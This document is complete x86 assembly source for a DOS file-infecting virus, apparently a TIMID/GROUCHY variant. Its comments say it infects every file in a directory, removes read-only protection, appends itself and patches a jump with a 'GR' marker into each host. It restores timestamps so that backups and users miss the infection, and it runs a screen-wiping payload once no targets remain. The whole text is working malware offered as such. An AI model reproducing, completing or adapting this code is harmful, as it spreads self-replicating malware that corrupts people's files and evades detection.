

;This program is a virus that infects all files, not just executables. It gets the first
;five bytes of its host and stores them elsewhere in the program and puts a
;jump to it at the start, along with the letters "GR", which are used to
;by the virus to identify an already infected program. The virus also save
;target file attributes and restores them on exit, so that date & time stamps
;aren't altered as with ealier TIMID\GROUCHY\T-HEH variants.
;For excitement, the virus will nibble away all letters on a text screen 
;leaving a blank, snowy monitor when it can find no philes to infect

MAIN    SEGMENT BYTE
        ASSUME  CS:MAIN,DS:MAIN,SS:NOTHING

        ORG     100H

;This is a shell of a program which will release the virus into the system.
;All it does is jump to the virus routine, which does its job and returns to
;it, at which point it terminates to DOS.

HOST:
        jmp     NEAR PTR VIRUS_START            ;Note: MASM is too stupid to assemble this correctly
        db      'GR'
        mov     ah,4CH
        mov     al,0
        int     21H             ;terminate normally with DOS

VIRUS:                          ;this is a label for the first byte of the virus

COMFILE DB      '*.*',0       ;search string for any file
FATTR   DB      0
FTIME   DW      0
FDATE   DW      0
ROW     DW      24

VIRUS_START:
        call    GET_START       ;get start address - this is a trick to determine the location of the start of this program
GET_START:                      ;put the address of GET_START on the stack with the call,
        sub     WORD PTR [VIR_START],OFFSET GET_START - OFFSET VIRUS  ;which is overlayed by VIR_START. Subtract offsets to get @VIRUS
        mov     dx,OFFSET DTA   ;put DTA at the end of the virus for now
        mov     ah,1AH          ;set new DTA function
        int     21H
        call    FIND_FILE       ;get any file to attack
        jnz     DESTROY         ;returned nz - go to destroy routine
        call    SAV_ATTRIB
        call    INFECT          ;have a good file to use - infect it
        call    REST_ATTRIB
EXIT_VIRUS:
        mov     dx,80H          ;fix the DTA so that the host program doesn't
        mov     ah,1AH          ;get confused and write over its data with
        int     21H             ;file i/o or something like that!
        mov     bx,[VIR_START]                          ;get the start address of the virus
        mov     ax,WORD PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)]         ;restore the 5 original bytes
        mov     WORD PTR [HOST],ax                                          ;of the COM file to their
        mov     ax,WORD PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)+2]       ;to the start of the file
        mov     WORD PTR [HOST+2],ax
        mov     al,BYTE PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)+4]       ;to the start of the file
        mov     BYTE PTR [HOST+4],al
        mov     [VIR_START],100H                        ;set up stack to do return to host program
        ret                                             ;and return to host

START_CODE:                     ;move first 5 bytes from host program to here
        nop                     ;nop's for the original assembly code
        nop                     ;will work fine
        nop
        nop
        nop

;--------------------------------------------------------------------------
;This DESTROY segment nibbles away at the text screen on the monitor when the virus 
;cannot find a fresh phile to infect

COLORMEM       EQU   0B800H      ;color video mem for page 1
MONOMEM        EQU   0A300H      ;monochrome video mem for page 1
BLANK          EQU   20H


DESTROY:
               
               MOV   CX,COLORMEM                  ;assume color display
               MOV   AH,15                        ;GET current video mode
               INT   10H
               CMP   AL,2                         ;is it color?
               JE    A2                           ;YES
               CMP   AL,3                         ;color?
               JE    A2                           ;YES
               CMP   AL,7                         ;monochrome?
               JE    A1                           ;yes
               INT   20H                          ;no? quit, then
 
;come here if 80 column text mode; put video segment in DS
A1:            MOV   CX,MONOMEM                   ;set for monochrome
A2:            MOV   BL,0                         ;BX=page offset
               ADD   CX,BX                        ;video segment
               MOV   DS,CX                        ;in DS
;Now, do nibble
               XOR   BX,BX                        ;start at top left color
A3:            PUSH  BX                           ;save row on stack
               MOV   BP,80                        ;reset column counter
;Do next column in a row
A4:            MOV   AH,0BH                       ;check if key pressed
               INT   21H
               CMP   AL,0F7H                      ;dummy value
               JE    A9                           ;Yes, quit
;continue with effect if no key pressed
               MOV   SI,BX                        ;set row top in SI
               MOV   AX,W[SI]                     ;get character and attribute from screen
               CMP   AL,BLANK                     ;is it a blank?
               JE    A7                           ;yes, so skip it
               MOV   DX,AX                        ;no, save it in DX
               MOV   AL,BLANK                     ;make it a space
               MOV   W[SI],AX                     ;and put it on screen
               ADD   SI,160                       ;set for next row
               MOV   DI,CS:ROW                    ;get rows remaining
A5:            MOV   AX,W[SI]                     ;get the character and attribute from the screen
               MOV   W[SI],DX                     ;put top row character and attribute there
A6:            MOV   W[SI],AX                     ;put original character and attribute back
;Do next row, this column
               ADD   SI,160                       ;next row
               DEC   DI                           ;done, all rows remaining?
               JNE   A5                           ;not yet, do next one
               MOV   W[SI-160],DX                 ;put character & attribute on line 25 as junk
;Do next column on this row
A7:            ADD   BX,2                         ;next column, same row
               DEC   BP                           ;dec column counter, done?
               JNE   A4                           ;no, do this column
;Do next row.
A8:            POP   BX                           ;get current row start
               ADD   BX,160                       ;next row
               DEC   CS:ROW                       ;all rows done?
               JNE   A3                           ;no, then branch
A9:            INT   20H                          ;yes,quit to DOS
               JMP   DESTROY                      ;and return to DESTROY



;---------------------------------------------------------------------------
;---------------------------------------------------------------------------

       
;-----------------------------------------------------------------------------
;Find a file which passes FILE_OK
;
;This routine does a simple directory search to find a COM file in the
;current directory, to find a file for which FILE_OK returns with C reset.
;
FIND_FILE:
        mov     dx,[VIR_START]
        add     dx,OFFSET COMFILE - OFFSET VIRUS        ;this is zero here, so omit it
        mov     cx,3FH          ;search for any file, no matter what the attributes
        mov     ah,4EH          ;do DOS search first function
        int     21H
FF_LOOP:
        or      al,al           ;is DOS return OK?
        jnz     FF_DONE         ;no - quit with Z reset
        call    FILE_OK         ;return ok - is this a good file to use?
        jz      FF_DONE         ;yes - valid file found - exit with z set
        mov     ah,4FH          ;not a valid file, so
        int     21H             ;do find next function
        jmp     FF_LOOP         ;and go test next file for validity
FF_DONE:
        ret


;--------------------------------------------------------------------------
;Function to determine whether the file specified in FNAME is useable.
;if so return z, else return nz.
;What makes a file useable?:
;              a) There must be space for the virus without exceeding the
;                 64 KByte file size limit.
;              b) Bytes 0, 3 and 4 of the file are not a near jump op code,
;                 and 'G', 'R', respectively
;
FILE_OK:
        mov     ah,43H                               ;the beginning of this
        mov     al,0                                 ;routine gets the file's
        mov     dx,OFFSET FNAME                      ;attribute and changes it
        int     21H                                  ;to r/w access so that when
        mov     [FATTR],cl                           ;it comes time to open the
        mov     ah,43H                               ;file, the virus can easily
        mov     al,1                                 ;defeat files with a 'read only'
        mov     dx,OFFSET FNAME                      ;attribute. It leaves the file r/w,
        mov     cl,0                                 ;because who checks that, anyway?
        int     21H
        mov     dx,OFFSET FNAME
        mov     al,2
        mov     ax,3D02H                                ;r/w access open file, since we'll want to write to it
        int     21H
        jc      FOK_NZEND                               ;error opening file - quit and say this file can't be used (probably won't happen)
        mov     bx,ax                                   ;put file handle in bx
        push    bx                                      ;and save it on the stack
        mov     cx,5                                    ;next read 5 bytes at the start of the program
        mov     dx,OFFSET START_IMAGE                   ;and store them here
        mov     ah,3FH                                  ;DOS read function
        int     21H

        pop     bx                                      ;restore the file handle
        mov     ah,3EH
        int     21H                                     ;and close the file

        mov     ax,WORD PTR [FSIZE]                     ;get the file size of the host
        add     ax,OFFSET ENDVIRUS - OFFSET VIRUS       ;and add the size of the virus to it
        jc      FOK_NZEND                               ;c set if ax overflows, which will happen if size goes above 64K
        cmp     BYTE PTR [START_IMAGE],0E9H             ;size ok - is first byte a near jump op code?
        jnz     FOK_ZEND                                ;not a near jump, file must be ok, exit with z set
        cmp     WORD PTR [START_IMAGE+3],5247H          ;ok, is 'GR' in positions 3 & 4?
        jnz     FOK_ZEND                                ;no, file can be infected, return with Z set
FOK_NZEND:
        mov     al,1                                    ;we'd better not infect this file
        or      al,al                                   ;so return with z reset
        ret
FOK_ZEND:
        xor     al,al                                   ;ok to infect, return with z set
        ret

;--------------------------------------------------------------------------
SAV_ATTRIB:
        mov     ah,43H                     ;these next routines retrieve the
        mov     al,0                       ;attributes of the targeted phile
        mov     dx,OFFSET FNAME            ;and save them. In the process the
        int     21H                        ;virus resets all "read-only" attributes
        mov     [FATTR],cl                 ;so that the phile is not protected
        mov     ah,43H                     ;after infection the virus restores
        mov     al,1                       ;the date and time stamps so that
        mov     dx, OFFSET FNAME           ;time of infection can't be pinpointed.
        mov     cl,0                       ;in addition, this prevents 'old' philes
        int     21H                        ;from being discovered by incremental
        mov     dx,OFFSET FNAME            ;backup regimens. It would be a strange
        mov     al,2                       ;sight for the user to discover
        mov     ah,3DH                     ;that his old philes were suddenly in need
        int     21H                        ;of backing up, wouldn't it? We don't want
        mov     [HANDLE],ax                ;that.
        mov     ah,57H
        xor     al,al
        mov     bx,[HANDLE]
        int     21H
        mov     [FTIME],cx
        mov     [FDATE],dx
        mov     ax,WORD PTR [DTA+28]
        mov     WORD PTR [FSIZE+2],ax
        mov     ax,WORD PTR [DTA+26]
        mov     WORD PTR [FSIZE],ax
        ret
;------------------------------------------------------------------
REST_ATTRIB:
       mov     dx,[FDATE]
       mov     cx, [FTIME]
       mov     ah,57H
       mov     al,1
       mov     bx,[HANDLE]
       int     21H
       mov     ah,3EH
       mov     bx,[HANDLE]
       int     21H
       mov     cl,[FATTR]
       xor     ch,ch
       mov     ah,43H
       mov     al,1
       mov     dx,OFFSET FNAME
       int     21H
       
       ret
;---------------------------------------------------------------------------
;This routine moves the virus (this program) to the end of the file
;Basically, it just copies everything here to there, and then goes and
;adjusts the 5 bytes at the start of the program and the five bytes stored
;in memory.
;
INFECT:
        xor     cx,cx                                   ;prepare to write virus on new file; positon file pointer
        mov     dx,cx                                   ;cx:dx pointer = 0
        mov     bx,WORD PTR [HANDLE]
        mov     ax,4202H                                ;locate pointer to end DOS function
        int     21H

        mov     cx,OFFSET FINAL - OFFSET VIRUS          ;now write the virus; cx=number of bytes to write
        mov     dx,[VIR_START]                          ;ds:dx = place in memory to write from
        mov     bx,WORD PTR [HANDLE]                    ;bx = file handle
        mov     ah,40H                                  ;DOS write function
        int     21H

        xor     cx,cx                                   ;now we have to go save the 5 bytes which came from the start of the
        mov     dx,WORD PTR [FSIZE]                     ;so position the file pointer
        add     dx,OFFSET START_CODE - OFFSET VIRUS     ;to where START_CODE is in the new virus
        mov     bx,WORD PTR [HANDLE]
        mov     ax,4200H                                ;and use DOS to position the file pointer
        int     21H

        mov     cx,5                                    ;now go write START_CODE in the file
        mov     bx,WORD PTR [HANDLE]                    ;get file handle
        mov     dx,OFFSET START_IMAGE                   ;during the FILE_OK function above
        mov     ah,40H
        int     21H

        xor     cx,cx                                   ;now go back to the start of host program
        mov     dx,cx                                   ;so we can put the jump to the virus in
        mov     bx,WORD PTR [HANDLE]
        mov     ax,4200H                                ;locate file pointer function
        int     21H

        mov     bx,[VIR_START]                          ;calculate jump location for start of code
        mov     BYTE PTR [START_IMAGE],0E9H             ;first the near jump op code E9
        mov     ax,WORD PTR [FSIZE]                     ;and then the relative address
        add     ax,OFFSET VIRUS_START-OFFSET VIRUS-3    ;these go in the START_IMAGE area
        mov     WORD PTR [START_IMAGE+1],ax
        mov     WORD PTR [START_IMAGE+3],5247H          ;and put 'GR' ID code in

        mov     cx,5                                    ;ok, now go write the 5 bytes we just put in START_IMAGE
        mov     dx,OFFSET START_IMAGE                   ;ds:dx = pointer to START_IMAGE
        mov     bx,WORD PTR [HANDLE]                    ;file handle
        mov     ah,40H                                  ;DOS write function
        int     21H
        
        ret                             ;all done, the virus is transferred

FINAL:                                  ;label for last byte of code to be kept in virus when it moves

ENDVIRUS        EQU     $ + 212         ;label for determining space needed by virus
                                        ;Note: 212 = FFFF - FF2A - 1 = size of data space
                                        ;      $ gives approximate size of code required for virus

        ORG     0FF2AH

DTA             DB      1AH dup (?)             ;this is a work area for the search function
FSIZE           DW      0,0                     ;file size storage area
FNAME           DB      13 dup (?)              ;area for file path
HANDLE          DW      0                       ;file handle
START_IMAGE     DB      0,0,0,0,0               ;an area to store 3 bytes for reading and writing to file
VSTACK          DW      50H dup (?)             ;stack for the virus program
VIR_START       DW      (?)                     ;start address of VIRUS (overlays the stack)


MAIN    ENDS


        END HOST

